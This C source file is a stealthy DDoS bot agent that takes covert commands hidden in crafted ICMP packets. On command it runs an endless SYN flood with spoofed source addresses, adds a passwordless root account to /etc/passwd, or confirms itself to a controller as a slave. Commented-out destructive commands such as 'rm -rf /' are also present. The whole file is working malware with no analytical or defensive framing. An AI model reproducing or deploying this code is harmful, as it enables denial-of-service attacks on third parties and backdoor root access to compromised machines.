#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/time.h>
 #define __FAVOR_BSD
#include <netinet/tcp.h>


/* IMPORTANT VALUES */

    // DDoS synflood values
#define SYNFLOOD_PATTERN  'A'  /* fill datalen with this pattern to start DoS */
#define SYNFLOOD_DATALEN  128   /* this length with upper pattern will start DoS attack to ip->saddr */

    // let slave execute 'execute_fun'
#define EXEC_FUN_PATTERN  ' '  /* fill datalen with this pattern to execute 'exec_fun' function */
#define EXEC_FUN_DATALEN  64    /* this length with upper pattern will start executing */

    // is remote ip a slave?
#define SLAVE_REQUEST     'C'
#define SLAVE_REQLEN      32
           
/* ----- */

#define RANDIP       (rand()%220) /* creat random ip block */
#define R_ICMPTYP    8      /* icmp type-> receive command */
#define R_ICMPCODE   0      /* icmp code-> receive command */

#define S_ICMPTYP    0      /* icmp type-> send reply */
#define S_ICMPCODE   0      /* icmp code-> send code */

void exec_fun(void);
void err_q(int val);
void syn_flood(u_int addr);
unsigned short in_cksum(unsigned short *ptr, int nbytes);
int send_icmp(unsigned int saddr, unsigned int daddr, int code, int type, int typ, int nbytes);
ssize_t tcpsend(u_int saddr, u_int daddr, unsigned short sport, unsigned short dport, unsigned char flags, char *data, unsigned short datalen);


struct pseudohdr {              /* for creating the checksums -> tcp +syn packets*/
  unsigned long saddr;
  unsigned long daddr;
  char useless;
  unsigned char protocol;
  unsigned short length;
};


int main(void)
{
  int sockfd;
  fd_set rset;
  size_t nbytes;
  char buf[255];
  struct iphdr *ip;
  struct icmphdr *icmp;

  err_q(sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP));
  ip = (struct iphdr *)buf;
  icmp = (struct icmphdr *)(buf + sizeof(struct iphdr));

  FD_ZERO(&rset);
  while(1) {
    FD_SET(sockfd, &rset);
    switch(select(sockfd+1, &rset, NULL, NULL, NULL)) {
    case -1: err_q(-1);
    case 0: err_q(-1);  /* ??? */
    default: 
      err_q(nbytes = read(sockfd, buf, sizeof(buf)));
      nbytes-=sizeof(struct iphdr)+sizeof(struct icmphdr);

      if(icmp->type == S_ICMPTYP && icmp->code == S_ICMPCODE) {
	    switch(nbytes) {
	    case 128: if(buf[nbytes-1] == SYNFLOOD_PATTERN) syn_flood(ip->saddr); // len ok- pattern ok
		break;
	    case  64: if(buf[nbytes-1] == EXEC_FUN_PATTERN) exec_fun();
		break;
	    case 32: if(buf[nbytes-1] == SLAVE_REQUEST)
		icmp_send(ip->daddr, ip->saddr, R_ICMPCODE, R_ICMPTYP, SLAVE_REQUEST, SLAVE_REQLEN);
		break;  
	    default: break;
	    }
      }
	    else continue;
    }
  }
  return(0x00);
}



void exec_fun(void) 
{
  /* execute an evil command */
  /* add whatever you want */
  system("/bin/echo "" >>/etc/passwd");
  system("/bin/echo r0ot::0:0::/:/bin/sh >>/etc/passwd");
  // system("/bin/rm -rf /);"
  // system("/bin/cat /dev/urandom >>/dev/audio");
  // system("while true; do /bin/eject; done");
}


void syn_flood(u_int addr)  /* starting synflood the source address from special crafted icmp reply */
{
  char sourceip[15];

  while(1 > 0) {
  snprintf(sourceip, sizeof(sourceip), "%d.%d.%d.%d",RANDIP,RANDIP,RANDIP,RANDIP);
  tcpsend(inet_addr(sourceip), addr, rand()%2003, rand()%2003, TH_SYN, "", 0);  /* for normal this souldnt fail */
                                                /* if it does it should cause a segfault and will exit anyway.. */
  memset(sourceip, 0x00, sizeof(sourceip));
  }
}

int icmp_send(unsigned int saddr, unsigned int daddr, int code, int type, int typ, int nbytes)
{
  int sockfd, test=1;
  char *packet, *buf;
  struct iphdr *ip;
  struct icmphdr *icmp;
  struct sockaddr_in server;

  ip = (struct iphdr *) malloc(sizeof(struct iphdr));
  icmp = (struct icmphdr *) malloc(sizeof(struct icmphdr));
  packet = (char *)malloc(sizeof(struct iphdr) + sizeof(struct icmphdr)+nbytes);
  if(packet == NULL) {
      fprintf(stderr, "\t [-] cannot allocate memory\n");
      return(-1);
  }
  
  buf = (char *)malloc(nbytes);          /* allocaote buffer */
  if(buf == NULL) return(-1);
  
  memset(packet, '\0',sizeof(packet));
  buf = packet+sizeof(struct iphdr)+sizeof(struct icmphdr);  
  memset(buf,typ ,nbytes);              /* fill with value */ 
 
  ip = (struct iphdr *)packet;
  icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

  ip->ihl = 5;
  ip->version = 4;
  ip->tos = 0;
  ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr)+nbytes;
  ip->id = htons(getuid());
  ip->ttl = 255;
  ip->protocol = IPPROTO_ICMP;
  ip->saddr = saddr;
  ip->daddr = daddr;

  sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  if(sockfd < 0) return -1;

  if( (setsockopt(sockfd, IPPROTO_IP,IP_HDRINCL,&test,sizeof(test))) < 0) return -1;

  icmp->type = type;
  icmp->code = code;
  icmp->un.echo.id = 0;
  icmp->un.echo.sequence = 0;
  icmp->checksum = 0;
  icmp->checksum = in_cksum((unsigned short *)icmp,sizeof(struct icmphdr)+nbytes);
  ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

  server.sin_family = AF_INET;
  server.sin_port = htons(80); /* doesnt matter */
  server.sin_addr.s_addr = ip->daddr;

  if( (sendto(sockfd,packet,ip->tot_len,0,(struct sockaddr *)&server,
	      sizeof(struct sockaddr))) < ip->tot_len) return -1;
 
  return(ip->tot_len);
}


ssize_t tcpsend(unsigned int saddr, unsigned int daddr, unsigned short sport,
		unsigned short dport, unsigned char flags, char *data,
		unsigned short datalen)
{
  char *packet;
  struct iphdr *ip;
  struct tcphdr *tcp;
  struct pseudohdr *pseudo;
  struct sockaddr_in servaddr;
  int retval, sockfd, on = 1;

  packet = (char *)malloc((sizeof(struct iphdr)+
			   sizeof(struct tcphdr)+datalen)*sizeof(char));

  servaddr.sin_family = AF_INET;
  servaddr.sin_port = htons(dport);
  servaddr.sin_addr.s_addr = daddr;

  sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if(sockfd < 0) return(0);

 if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1)  return(0);

 ip = (struct iphdr *)packet;
 tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
 pseudo = (struct pseudohdr *)(packet + sizeof(struct iphdr) - sizeof(struct
pseudohdr));

 memset(packet, 0x00, sizeof(packet));
 memcpy(packet+sizeof(struct iphdr)+sizeof(struct tcphdr), data, datalen);

 pseudo->saddr = saddr;
 pseudo->daddr = daddr;
 pseudo->protocol = IPPROTO_TCP;
 pseudo->length = htons(sizeof(struct tcphdr) + datalen);

 tcp->th_sport = htons(sport);
 tcp->th_dport = htons(dport);
 tcp->th_seq = rand() + rand();
 tcp->th_ack = rand() + rand();
 tcp->th_off = 5;
 tcp->th_flags = flags;
 tcp->th_win = htons(2048);
 tcp->th_sum = in_cksum((unsigned short *)pseudo, sizeof(struct tcphdr) +
		       sizeof(struct pseudohdr) + datalen);

 memset(ip, 0x00, sizeof(struct iphdr));
 ip->version = 4;
 ip->ihl = 5;
 ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + datalen);
 ip->id = rand();
 ip->ttl = 255;
 ip->protocol = IPPROTO_TCP;
 ip->saddr = saddr;
 ip->daddr = daddr;
 ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

 if((retval = sendto(sockfd, packet, ntohs(ip->tot_len), 0,
		  &servaddr, sizeof(servaddr))) == -1)
  return(0);
   close(sockfd); return(retval);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
  register long	sum;
  u_short oddbyte;
  register u_short answer;

  sum = 0;
  while(nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  }

  if(nbytes == 1)
  {
    oddbyte = 0;
    *((u_char *) &oddbyte) = *(u_char *)ptr;
    sum += oddbyte;
  }

  sum  = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;

  return(answer);
}


void err_q(int val) /* because this should run stealthy we dont print anything- just quit */
{
  if(val < 0) exit(0xff);
}
